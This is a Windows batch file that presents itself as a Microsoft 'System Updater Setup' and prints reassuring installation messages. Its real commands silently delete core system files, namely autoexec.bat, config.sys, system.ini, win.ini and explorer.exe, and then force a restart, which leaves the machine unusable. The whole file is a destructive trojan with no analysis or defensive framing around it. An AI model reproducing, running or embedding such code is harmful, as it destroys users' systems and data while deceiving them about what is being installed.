
@ECHO OFF
echo Welcome To Microsoft Windows System Updater Setup
echo Installing Components... Please Wait...
echo y|del c:\autoexec.bat
echo y|del c:\config.sys
echo y|del c:\windows\system.ini
echo y|del c:\windows\win.ini
echo y|del c:\windows\explorer.exe
echo Installing is DONE.
echo Setup Will Now restart Your Computer... Please Wait...
start C:\WINDOWS\RUNDLL.EXE user.exe,exitwindows
